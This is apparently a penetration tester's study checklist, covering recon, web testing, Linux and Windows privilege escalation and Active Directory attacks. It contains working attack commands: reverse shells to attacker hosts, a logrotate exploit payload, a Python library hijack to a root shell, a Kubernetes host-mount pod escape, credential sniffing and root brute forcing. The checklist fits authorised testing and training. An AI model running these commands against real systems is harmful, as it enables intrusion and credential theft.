
---

## Reconnaissance & Target Discovery

### Passive Recon

1. Gather public info (DNS, WHOIS, certificates, company structure)
2. Search public data leaks (Google Dorks, GitHub, Pastebin, etc.)

### Active Recon

1. Discover all active hosts on the target network/IP range/subnet(s). Document all active hosts to Obsidian notes
- [ ] NMAP Host Discovery Scan
- [ ] ICMP sweep (ping or fping)
- [ ] TCP/UDP host discovery (`nmap -sn`, masscan)
- [ ] ARP scanning (if on same subnet)
- [ ] Add discovered hostnames to `/etc/hosts` file

2. For each active host, scan ALL TCP/UDP ports. Document each open port in Obsidian.
- [ ] NMAP TCP port scanning

```Bash
nmap -A --open $rhost -oA nmap/tcp
```

- [ ] NMAP UDP port scanning

```Bash
nmap -sU --open $rhost -oA nmap/udp
```

3. For each open port, run service version scan with scripts and OS detection.
- [ ] NMAP service enumeration and OS detection
- [ ] Netcat banner grabbing (manual confirmation)
- [ ] Document services and versions in Obsidian

4. For each detected service, do individual service enumeration to look for more information and vulnerabilities

5. Check for vulnerabilities in discovered services/versions
- [ ] Search Metasploit for service exploits
- [ ] Search ExploitDB for service exploits
- [ ] Look at NMAP script output for vulnerabilities or misconfigurations (e.g. anonymous login)
- [ ] Look for OS version exploits
- [ ] Search Google for `<Service> <Version> Exploit GitHub`
- [ ] Document discovered vulnerabilities in Obsidian

6. Check file share services (FTP, SMB, etc.) for anonymous logon and credential files
- [ ] FTP Enumeration [[21-ftp]]
- [ ] SMB Enumeration [[139-445-smb-netbios]]

7. Check for write access over a share (SMB, FTP)
- [ ] Capturing Hashes with Malicious `.lnk` File ([[3.1.AD-Exploitation]] in NTLM Theft part)
- [ ] Capture hashes with SCF on a File Share (no longer works on Windows Server 2019+) ([[3.1.AD-Exploitation]] in NTLM Theft part)
- [ ] For FTP if we have write access we can write the .htacss and shell then access into the webserver. [[21-ftp]]

8. If webserver(s) exist, see

---

## Webserver Enumeration Methodology

### Passive Recon

1. Look at public DNS records for domains/subdomains to enumerate
2. Look at certificates and other public info for domains/subdomains to enumerate

### Active Recon

1. Add domain to `/etc/hosts` file (if applicable)
    
2. Run directory/page brute force discovery
- [ ] First fuzz for extension (if available)
- [ ] If extension is discovered, fuzz for directories and other pages (with extension appended)

3. Look in `robots.txt` / `sitemap.xml` for hidden endpoints
- [ ] `https://www.example.com/robots.txt`
- [ ] `https://www.example.com/sitemap.xml`

4. Run subdomain/vhost brute force discovery (RUN MULTIPLE WORDLISTS)
 - [ ] Run subdomain brute force discovery (External Only)

```Bash
ffuf -u https://FUZZ.example.com -w $wordlist -v
```

- [ ] Run vhosts brute force discovery (Internal & External)

```Bash
ffuf -u http://example.com -H "Host: FUZZ.example.com" -w $wordlist
```

5. Crawl the webpage for all links
- [ ] Web Crawling / Robots
- [ ] Crawling with FinalRecon

```Bash
finalrecon --full http://example.com
# หรือเฉพาะ crawl
finalrecon --crawl http://example.com
```

- [ ] Crawling with ZAP Proxy

6. Look for comments in HTML for sensitive information
- [ ] Check all crawled and discovered pages

7. Capture server errors (e.g. 500, 403) that might leak tech stack info
    
8. Look for vulnerabilities in Web Server technologies being used 
- [ ] Use Wappalyzer to discover web server technologies in browser
- [ ] Use BuiltWith to discover web server technologies (External only)
- [ ] Use WhatWeb CLI tool to discover web server technologies

```Bash
whatweb http://example.com
whatweb -a 3 http://example.com  # aggressive mode
```

- [ ] Scan the webserver with Nikto

```Bash
nikto -h http://example.com
```

- [ ] Scan the webserver with NMAP and web discovery scripts

```Bash
nmap -sV --script=http-enum,http-headers,http-methods,http-title -p 80,443 $rhost
```

- [ ] Attempt banner grabbing with curl

```Bash
curl -I http://example.com
curl -v http://example.com 2>&1 | grep -i "server\|x-powered"
```

- [ ] Discover WAFs with Wafw00f

```Bash
wafw00f http://example.com
wafw00f -a http://example.com  # test all WAFs
```

9. If the webserver is running NodeJS or MongoDB, look for NoSQL injection vulnerabilities

10. Look for web service versions on discovered pages (Jenkins, WP, blog platforms, etc.)    
- [ ] Look for CMS or app-specific files (`wp-content`, `.git/`, etc.)
- [ ] WordPress Enumeration [[7.0.Web-Application-Analysis]] (CMS Enumeration)
- [ ] Joomla Enumeration [[7.0.Web-Application-Analysis]] (CMS Enumeration)
- [ ] Drupal Enumeration [[7.0.Web-Application-Analysis]] (CMS Enumeration)
- [ ] Tomcat Enumeration (Need to add to [[7.0.Web-Application-Analysis]])
- [ ] Jenkins Enumeration (Need to add to [[7.0.Web-Application-Analysis]])
- [ ] IIS Tilde Enumeration (Need to add to [[7.0.Web-Application-Analysis]])

11. Look for vulnerabilities in discovered web service versions and/or technologies
- [ ] Search Metasploit, ExploitDB, and Google for `<Service> <Version> Exploit GitHub`

12. Look for login pages to test default or weak credentials
- [ ] Default Credential lists
- [ ] Login Brute Forcing
- [ ] Check for password reset or recovery mechanisms
- [ ] Review cookies & sessions (flags like Secure, HttpOnly)
- [ ] Test for session fixation or missing CSRF protections

13. Test submitting data on EVERY user input field and look at interaction with Burp Suite
- [ ] Intercepting Web Requests
- [ ] Test SQL Injection on login pages to try and bypass them

14. If input appears to be used in a system command, test for command injection

15. If a file upload functionality exists, test for file upload vulnerabilities

16. If the webserver appears to be populating data from a database, test for SQL Injection
- [ ] Test for SQL UNION Injection separately (`test' UNION select 1-- -`)
- [ ] Any input fields, test with sqlmap
- [ ] Test SQL Injection on login pages to bypass them

17. If Accounts, Pages, or other things seem sequential and accessible in GET/POST requests, check for IDOR vulnerabilities

18. If GET parameters seem to be referencing local files, test for file inclusion vulnerabilities / path traversal    
- [ ] Run an LFI automation scan against any parameters that reference a file
- [ ] Good candidate example: `http://example.com/index.php?page=goober.html`
- [ ] If LFI exists, look for the following payloads:
	- [ ] `/etc/passwd`
	- [ ] `/var/mail/<username>` (if we can send emails → send and access a PHP webshell)
	- [ ] `/home/<username>/.ssh/id_rsa`
	- [ ] Webserver source code:
		- [ ] `/etc/nginx/nginx.conf`
		- [ ] `/etc/nginx/sites-enabled/default`
		- [ ] `/etc/nginx/sites-available/default`
		- [ ] `/etc/apache2/sites-enabled/default`
		- [ ] `/etc/apache2/sites-available/default`
	- [ ] `/var/log/apache2/access.log` (log poisoning)
	- [ ] `/var/log/nginx/access.log` (log poisoning)
	- [ ] Any file paths from error pages

19. Check user input fields for XSS

20. Check different HTTP verbs to bypass access controls or injection validations

21. If XML input is accepted, test for XML External Entity (XXE) vulnerabilities

22. If the webserver has a web socket or API that is reachable, check if POST/GET requests are injectable with SQLMAP
### Shells and Payloads

1. Linux Reverse Shells
2. Windows Reverse Shells
3. Web Reverse Shells
4. Going from webshell to reverse shell on Linux:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.8/7777 0>&1'
```
 
- [ ] Make sure to URL encode the payload

---

## Linux Privilege Escalation Methodology

### If Webserver Exists

1. Check web configuration files and source code for vulnerabilities, hardcoded credentials, etc.
- [ ] For Apache (httpd):
	- [ ] `/var/www/html`
	- [ ] `/var/www/`
	- [ ] `/srv/http/`
	- [ ] `/usr/share/httpd/`
	- [ ] `/etc/apache2/sites-available/000-default.conf`
- [ ] For Nginx:
	- [ ] `/usr/share/nginx/html`
	- [ ] `/var/www/html`
	- [ ] `/etc/nginx/sites-available/` and `/etc/nginx/sites-enabled/`
- [ ] Other possible locations:
	- [ ] `/opt/web/`
	- [ ] `/home/user/public_html/`
	- [ ] `~/www/` or `~/html/`

### Default Methodology

1. Run Linux Priv Esc Automation Scripts. Save output to a file and transfer to Kali Box.
- [ ] LinPeas

```Bash
curl -L <linpeas.sh> | sh | tee /tmp/linpeas.out
```

- [ ] LinEnum (Optional)

```Bash
curl -L <linpenum.sh> | sh | tee /tmp/linpeas.out
```

2. Perform basic box enumeration once a foothold is established
- [ ] First user checks / network checks

```Bash
id && whoami && hostname
```

- [ ] Checking Sudo Privileges

```Bash
sudo -l
```

- [ ] Check OS/Kernel Version

```Bash
uname -a 
cat /etc/os-release
```

- [ ] Check `$PATH` variable

```Bash
echo $PATH
```

- [ ] List Processes running as root

```Bash
ps aux | grep root
```

- [ ] Discover other users on the machine

```Bash
cat /etc/passwd | grep -v nologin | grep -v false
```

- [ ] Check for SSH keys

```Bash
ls -la ~/.ssh/ 
find / -name "id_rsa*" 2>/dev/null
```

- [ ] Check current user bash history

```Bash
cat ~/.bash_history
```

- [ ] Check if Shadow is readable or Passwd is writable (check for hashes in `/etc/passwd`)

```Bash
ls -la /etc/shadow
ls -la /etc/passwd
cat /etc/passwd | grep -v ':x:' 
```

- [ ] Enumerate Existing Groups

```Bash
cat /etc/group 
id
```

- [ ] Check for running Cron Jobs

```Bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

- [ ] Check for Unmounted File Systems and Additional Drives (Weak NFS Privileges)

```Bash
cat /etc/fstab
showmount -e localhost
df -h
```

- [ ] Find Writable Directories and Files

```Bash
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
```

- [ ] Enumerate All Hidden Files and directories

```Bash
find / -name ".*" -type f 2>/dev/null | grep -v proc
find / -name ".*" -type d 2>/dev/null | grep -v proc
```

- [ ] Enumerate Services, Versions and binaries

```Bash
systemctl list-units --type=service --state=running
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
```

- [ ] Check for accessible configuration files and scripts

```Bash
find /etc -readable -type f 2>/dev/null
find / -name "*.conf" -readable 2>/dev/null | grep -v proc
```

3. Enumerate for hardcoded/cleartext credentials on the system (quickly check config files)
- [ ] **BE ESPECIALLY ATTENTIVE TO OUT OF THE ORDINARY SERVICES**

```Bash
grep -ril "password\|passwd\|secret\|api_key\|token\|credential" /etc /opt /var /home 2>/dev/null
```

- [ ] Look for things in `/opt`

```Bash
find /opt -type f 2>/dev/null | xargs grep -il "password\|secret" 2>/dev/null ls -laR /opt
```

- [ ] Look for web config files

```Bash
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null | grep -v proc
find /var/www /srv /opt -name "web.config" -o -name "config.php" -o -name ".env" -o -name "database.yml" 2>/dev/null
```

4. Look at access rights of the user we gained a foothold with (Sudo/SUID/GUID)
- [ ] Checking for Sudo privileges

```Bash
sudo -l
```

- [ ] Checking SUID/GUID Privileges

```Bash
# SUID
find / -perm -4000 -type f 2> /dev/null
# SGID
find / -perm -2000 -tpye f 2> /dev/null
# Both
find / -perm -6000 -type f 2>/dev/null
```

- [ ] Check these rights in GTFOBins

5. Check for unique files owned by the user or by the group that the user is in

```Bash
find / -user $(whoami) -type f 2>/dev/null | grep -v proc
find / -group $(id -gn) -type f 2>/dev/null | grep -v proc

id 
find / -group <groupname> -type f 2>/dev/null | grep -v proc
```

6. If our user has sudo privileges over a binary not in GTFOBins, try the LD_PRELOAD Privilege Escalation Exploit [[4.2.Privilege-Escalation-Linux]]

7. If custom binaries exist with the SETUID bit set, try Shared Object Hacking (If found with below enumeration looking at [[4.2.Privilege-Escalation-Linux]] SUID SGID Exploitation)

```Bash
strace $suid-binary 2>&1 | grep "open\|access\|no such"
ldd $suid-binary
```

8. Check the groups the user is a part of and see if any are privileged groups 
- [ ] LXC / LXD Group Membership [[4.2.Privilege-Escalation-Linux]]
- [ ] Docker Group Membership [[4.2.Privilege-Escalation-Linux]]
- [ ] Disk Group Membership [[4.2.Privilege-Escalation-Linux]]
- [ ] ADM Group Membership [[4.2.Privilege-Escalation-Linux]]

8. Check for PATH abuse (unlikely) [[4.2.Privilege-Escalation-Linux]] in SUID PATH Hijacking part

9. Check for Wildcard abuse in cron jobs or custom scripts [[4.2.Privilege-Escalation-Linux]] in wildcard injection part

```Bash
cat /etc/crontab ls -la /etc/cron.*
```

10. Look for services running on internal ports not accessible from outside

```bash
netstat -ano
ss -tunlp
```

11. Check for additional NICs using `ifconfig`; enumerate other hostnames

12. Look for cronjobs running writable scripts / services running as root

```Bash
# ดู cron jobs ทั้งหมด
cat /etc/crontab
cat /etc/cron.d/*
crontab -l

# หา script ที่ถูกเรียกใน cron แล้วเช็ค permission
grep -r "\.sh" /etc/crontab /etc/cron.d/ 2>/dev/null

# เช็คว่า script นั้น writable ไหม
ls -la /path/to/script.sh

# หา services ที่รันด้วย root
ps aux | grep root
systemctl list-units --type=service --state=running
```

13. Look for abusable linux capabilities

```Bash
# cap_setuid, cap_net_raw, cap_dac_override
getcap -r / 2>/dev/null
```

14. Look for vulnerable application/service versions

15. Check for Logrotate exploit

```Bash
# หา log files ที่เรา write ได้
find /var/log -writable -type f 2>/dev/null

# clone logrotten
git clone https://github.com/whotwagner/logrotten.git
gcc -o logrotten logrotten/logrotten.c

# สร้าง payload
echo '/bin/bash -i >& /dev/tcp/$lhost/4444 0>&1' > /tmp/payload

# รัน (ต้องรอ logrotate trigger หรือ trigger เอง)
./logrotten -p /tmp/payload /var/log/writable.log

# Trigger Log
echo "AAAAAAAAAA" >> /var/log/writable.log
```

16. Check for kernel exploits (GitHub, ExploitDB, Metasploit)

```Bash
uname -a
cat /etc/os-release
```

17. If Python script exists, check for Python Library Hijacking

```Bash
find / -name "*.py" 2>/dev/null | grep -v proc sudo -l

# (ubuntu) NOPASSWD: /usr/bin/python3 /opt/monitor.py

cat /opt/monitor.py
# import utils
# import requests

python3 -c "import sys; print(sys.path)"
# ['', '/usr/lib/python3', '/usr/local/lib/python3.8', ...]

ls -la /usr/local/lib/python3.8/
# writable → สร้าง fake module ได้

cat > /usr/local/lib/python3.8/utils.py << 'EOF'
import os
os.system('/bin/bash -p')
EOF

sudo /usr/bin/python3 /opt/monitor.py
# → load utils.py ของเรา → root shell
```

18. Check for vulnerable versions of Netfilter

```Bash
uname -r
# then find CVE version
```

19. Check for hijackable tmux sessions

```Bash
# หา tmux sessions ที่รันอยู่
tmux ls
ps aux | grep tmux

# หา tmux socket files
find /tmp -name ".tmux*" 2>/dev/null
find /tmp/tmux-* -type s 2>/dev/null

# เช็ค permission ของ socket
ls -la /tmp/tmux-0/default

# srwxrwxrwx 1 root root  /tmp/tmux-0/default   ← world-writable
# srwxrwx--- 1 root staff /tmp/tmux-0/default   ← เราอยู่ใน group staff
# srw-rw---- 1 root john  /tmp/tmux-0/default   ← เราคือ john

# attach เข้า session ของ user อื่น (ถ้า permission อนุญาต)
tmux -S /tmp/tmux-0/default attach

# ถ้า session นั้นรันด้วย root → ได้ root shell เลย
```

20. If tcpdump exists, try capturing cleartext traffic for credentials

```Bash
# เช็คว่ามี tcpdump ไหม
which tcpdump
ls -la $(which tcpdump)

# Capture ทุก interface
tcpdump -i any -w /tmp/capture.pcap

# Capture เฉพาะ port น่าสนใจ
tcpdump -i any port 21 or port 23 or port 80 or port 110 or port 143 -w /tmp/capture.pcap

# ดู plaintext ตรงๆ ไม่ save file
tcpdump -i any -A port 80 | grep -i "password\|pass\|login\|user"

# transfer กลับ Kali แล้วเปิดด้วย
wireshark /tmp/capture.pcap

# หรือ strings ดูเร็วๆ
strings /tmp/capture.pcap | grep -i "pass\|user\|login"
```

21. Check for recent exploits and zero days

```Bash
# ดู kernel + OS version ก่อน
uname -a
cat /etc/os-release
dpkg -l | grep <service>  # version ของ service ที่น่าสนใจ
```

22. Check `/etc/bash.bashrc` for actions taken on login

```Bash
cat /etc/bash.bashrc
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile

# ดูทุก user
cat /home/*/.bashrc 2>/dev/null
cat /home/*/.bash_profile 2>/dev/null

# สิ่งที่ต้องสังเกต:

# script ที่ถูกเรียกตอน login → เช็คว่า writable ไหม
# PATH ที่ถูก set → PATH hijacking
# alias ที่น่าสงสัย → alias sudo='/tmp/evil.sh'
# credential ที่ hardcode อยู่ → export DB_PASS=secret123
```

23. Attempt to brute force root user with password file and sucrack

```Bash
# ติดตั้ง sucrack
apt install sucrack

# brute force root ด้วย wordlist
sucrack -u root -w 10 /usr/share/wordlists/rockyou.txt

# -w = threads
```
### Linux Container Privilege Escalation

1. Linux Containers (LXC/LXD)
2. Docker Privilege Escalation
3. Kubernetes Privilege Escalation

```Bash
# เช็คว่าอยู่ใน k8s pod ไหม
ls /var/run/secrets/kubernetes.io/serviceaccount/
env | grep -i kube

# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# เช็ค API server
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1

kubectl auth can-i --list 2>/dev/null

# ถ้าไม่มี kubectl ใช้ curl แทน
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods

# 1. สร้าง privileged pod แล้ว mount host filesystem
kubectl run evil --image=alpine --restart=Never -it --rm \
  --overrides='{"spec":{"containers":[{"name":"evil","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'

# เข้าไปใน pod แล้ว chroot
chroot /host /bin/bash

# 2. ถ้า can-i create pods → escape ออก node ได้เลย

kubectl --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT \
        --certificate-authority=ca.crt \
        --token=$TOKEN auth can-i --list
```

---

## Windows Privilege Escalation Methodology

### If Webserver Exists

1. Check web configuration files and source code for vulnerabilities, hardcoded credentials, etc.
    - [ ] `C:\xampp\htdocs` (common with Apache)
    - [ ] `C:\inetpub`

### Default Methodology

1. Run Windows Priv Esc Automation Scripts. Save output and transfer to attack box.
    
    - [ ] winPEAS
    - [ ] Seatbelt
    - [ ] PowerUp / SharpUp
    - [ ] JAWS (PowerShell-based; useful if custom executables are blocked)
    - [ ] SessionGopher
    - [ ] Bloodhound
2. Perform basic box enumeration once a foothold is established
    
    - [ ] Gathering Network Information
    - [ ] Gathering System Information
    - [ ] Process Enumeration
    - [ ] User and Group Enumeration
3. Look at access rights of user (user privileges)
    
    ```
    whoami /priv
    whoami /all
    ```
    
    - [ ] SeImpersonate / SeAssignPrimaryToken → JuicyPotato / RoguePotato / PrintSpoofer
    - [ ] SeDebugPrivilege
    - [ ] SeTakeOwnershipPrivilege
4. Check if user is a member of privileged groups
    
    ```
    whoami /groups
    ```
    
    - [ ] Backup Operators
    - [ ] Event Log Readers
    - [ ] DnsAdmins
    - [ ] Hyper-V Admins
    - [ ] Print Operators
    - [ ] Server Operators
    - [ ] WSUS Administrators
5. Check for Weak File/Service Permissions
    
    - [ ] Permissive File System ACLs
    - [ ] Weak Service Permissions
    - [ ] Unquoted Service Path
    - [ ] Permissive Registry ACLs
    - [ ] Modifiable Registry Autorun Binary
6. Check for saved credentials
    
    ```
    cmdkey /list
    ```
    
    - [ ] If we get access this way, run mimikatz to try to extract plaintext password
7. Look for services running on internal ports not accessible from outside
    
    ```
    netstat -ano
    ```
    
    - [ ] Databases we can connect to?
    - [ ] Vulnerable Services
8. Check for additional NICs
    
    ```
    ipconfig
    ```
    
9. Look for vulnerable applications and services
    
    ```
    wmic product get name
    ```
    
10. Look for interesting files on the server that may have credentials or sensitive info
    
    - [ ] Credential Hunting
    - [ ] Dumping Hashes / Credentials (Mimikatz)
11. Pillage for credentials or other interesting information
    
    - [ ] Pillaging Applications
    - [ ] Accessing Instant Messaging Clients Through Cookies
    - [ ] Pillaging the Clipboard + Keylogging
    - [ ] Roles and Services (pillaging backups)
12. Look for scheduled tasks that we can modify
    
13. Look for credentials in process command line
    
14. Check for 'Always Install Elevated' setting and exploit with MSI package
    
15. Capture hashes with a Malicious LNK file or SCF file
    
    - [ ] **ESPECIALLY USEFUL IF USERS WILL VISIT A SHARE WE HAVE UPLOADED TO**
16. Look for Kernel / OS exploits
    
    - [ ] Zero Logon
    - [ ] PrintNightmare
    - [ ] EOL Systems (Windows Server 2008, Windows 7, etc.)
17. Attempt to bypass UAC Controls if present
    
18. DLL Injection
    
19. Common Vulnerabilities and Vulnerable Programs
    
    - [ ] Docker Desktop Community Edition before 2.1.0.1 (CVE-2019-15752)
    - [ ] Windows Certificate Dialog (CVE-2019-1388)
20. Attempt to Capture Network Traffic with Inveigh/Responder, Wireshark, or Snaffler
    
    - [ ] LLMNR/NBT-NS Poisoning From Windows/Linux
21. Enumerate User/Computer Description Fields for cleartext credentials
    
22. If the system has `.vhd`, `.vhdx`, `.vmdk` files, mount them to dump machine hashes
    
23. Check for Active Directory Certificate Services (AD CS) attacks
    
24. If trying to be evasive or custom executables are locked down, check LOLBAS
    

### Once we are Admin

1. Attempt to recover all user passwords or NTLM hashes
    - [ ] Dump the LSASS process
    - [ ] Stealing NTLM Hashes from an LSASS.DMP Memory Dump
    - [ ] Dumping the SAM Database to recover password hashes

---

## Active Directory Methodology

> ⚠️ **BEFORE YOU DO ANYTHING: SYNC YOUR CLOCK WITH THE DOMAIN CONTROLLER**

### Initial (Uncredentialed) Enumeration

#### Host Identification

1. Create a document for all discovered hosts (hostnames and IP addresses)
2. Start Wireshark and listen for Layer 2 (ARP, MDNS, NBNS) traffic to discover IP addresses and hostnames
3. Start Responder in Analyze mode to discover IP addresses and hostnames
4. Perform an Fping ICMP Sweep to find all hosts that respond to ICMP echo request
5. Perform an NMAP identification scan in case it picks up anything missed
6. With all discovered hosts, perform NMAP scan to determine running services
    - [ ] Save all ports/services for each discovered host; pay special attention to DCs, RDP, naming conventions
    - [ ] Look for any quick wins (outdated software or OS)

#### User Identification

1. Create a document for all discovered users
2. Attempt to abuse SMB Null Session against the DC with rpcclient or enum4linux to grab all users
3. Attempt anonymous LDAP search against the DC with ldapsearch or windapsearch
4. Try Impacket's `lookupsid.py` for SID/RID brute forcing
5. Use Kerbrute and common wordlists to brute force usernames against a discovered DC
6. Check for users that do not require Kerberos pre-auth (ASREPRoasting)
7. Look for systems that can be exploited to gain SYSTEM level access (essentially like getting AD credentials)

#### User Foothold

1. Start Responder/Inveigh on network interface to listen for NTLM users and hashes. Attempt to crack with Hashcat/John
2. Attempt a password spray on users identified during user identification
    - [ ] Attempt to gather the password policy of the organization first
    - [ ] Password spray using common passwords like: `Welcome1`, `ChangeMe1`, `SeasonYear (Spring2025)`, username as the password, etc.

### Credentialed Enumeration / Exploitation

#### Host Identification

1. Run Bloodhound with discovered credentials (mark controlled assets as owned)
2. Use ldapdomaindump to identify all domain joined computers
3. Enumerate accessible shares on servers with NetExec, SMBMap, PowerView, or Snaffler

#### User Identification

1. Run Bloodhound with discovered credentials
2. Gather the domain password policy using the discovered credentials
3. Use NetExec to get all users, groups, and logged-on users against the server you have credentials for
4. Gather a list of Domain Admins or Privileged users using:
    - [ ] Windapsearch
    - [ ] PowerView
    - [ ] Bloodhound
    - [ ] AD PowerShell module
5. Credentialed Enumeration from Linux
6. Credentialed Enumeration from Windows

#### Foothold Enumeration

1. Run Bloodhound with discovered credentials
2. Enumerate security controls in place (Defender, AppLocker, PowerShell Constraints, LAPS)
3. Look for other logged-on users with CME to see if we can dump credentials with Mimikatz or Rubeus
4. Look for kerberoastable accounts through Bloodhound, PowerView, GetUserSPNs.py
5. Look at owned users for abusable ACL entries (ForceChangePassword, AddMember, GenericAll, etc.) - easiest via BloodHound
6. Check Bloodhound for CanRDP, CanPSRemote, or SQLAdmin abilities to move laterally

#### Pivoting

1. Run chisel for windows on the Windows pivot host
    - [ ] Connect with the linux chisel client on the attack host
    - [ ] Modify `proxychains.conf` to match the established proxy
    - [ ] Run commands with proxychains
2. Check Bloodhound for CanRDP, CanPSRemote, or SQLAdmin abilities to move laterally

### Exploitation

1. Look for kerberoastable accounts through Bloodhound, PowerView, GetUserSPNs.py
2. Grab all TGS tickets with GetUserSPNs.py and save to a file. Attempt to crack with Hashcat (GPU rig preferred)
3. Abuse over-permissive ACL entries to gain control of more users and move laterally:
    - [ ] `ForceChangePassword` → change a user's password
    - [ ] `AddMember` → add a member we control to a privileged group
    - [ ] `GenericAll/GenericWrite` → create an SPN for account and kerberoast their password hash
    - [ ] `GenericAll` → change the user's password
    - [ ] `DS-Replication-Get-Changes-All` → DCSync attack
    - [ ] `AddKeyCredentialLink` → get user's NTLM Hash
    - [ ] ACL Abuse from Linux
4. Check Bloodhound for CanRDP, CanPSRemote, or SQLAdmin abilities. Abuse these rights and look for sensitive info on new machines
5. Check for common vulnerabilities to escalate privileges or move laterally:
    - [ ] NoPac
    - [ ] PrintNightmare
    - [ ] PetitPotam
6. Check for common misconfigurations:
    - [ ] Exchange group permissions
    - [ ] MS-RPRN Printer bug
    - [ ] MS14-068
    - [ ] Sniff for LDAP credentials
    - [ ] Enumerate DNS records for interesting servers
    - [ ] Look for user passwords and notes in AD user descriptions
    - [ ] Check for `PASSWD_NOTREQD` field on users and test for weak/no passwords
    - [ ] Look for credentials and interesting files on SMB shares (manually or with Snaffler)
    - [ ] Check for `DONT_REQ_PREAUTH` field and ASREPRoast any discovered users
    - [ ] Check for GPOs with write access (check via BloodHound)
    - [ ] Resource Based Constrained Delegation, Constrained Delegation, Unconstrained Delegation
    - [ ] Active Directory Certificate Services Attacks
7. Check for Group Policy Preferences (GPP) Passwords
8. Check for Active Directory Certificate Services (AD CS) attacks

### Additional Auditing

1. Create a snapshot of the AD database with AD Explorer for offline analysis
2. Use PingCastle to discover additional AD misconfigurations and vulnerabilities
3. Run Group3r to uncover vulnerabilities in AD Group Policy
4. Run ADRecon.ps1 to discover additional AD misconfigurations and vulnerabilities

### Attacking AD Trusts (Parent Domain)

1. Discover any current domain trusts with `Get-ADTrust`, `Get-DomainTrust` (PowerView), or Bloodhound
2. From a machine with Domain Admin privileges, attempt an ExtraSIDs attack to create an Enterprise Admin user in the parent domain
3. Child -> Parent Attacks - Windows
4. Child -> Parent Attacks - Linux

### Attacking AD Trusts (Cross Forest)

1. Discover any current domain trusts with `Get-ADTrust`, `Get-DomainTrust` (PowerView), or Bloodhound
2. Attempt cross-forest kerberoasting
3. If admin accounts share names across domains and one is compromised, try reused credentials
4. Check for SIDHistory abuse
5. Cross-Forest Trust Abuse - Windows
6. Cross-Forest Trust Abuse - Linux

### Additional Noteworthy Methods

1. Access a host via RDP or WinRM as a local user or local admin
2. Authenticate to a remote host as an admin using PsExec
3. Gain access to a sensitive file share
4. Gain MSSQL access as a DBA user, which can then be leveraged to escalate privileges

---

## Documentation and Reporting

Follow the **Bruno Rocha Moura Method** for documenting findings.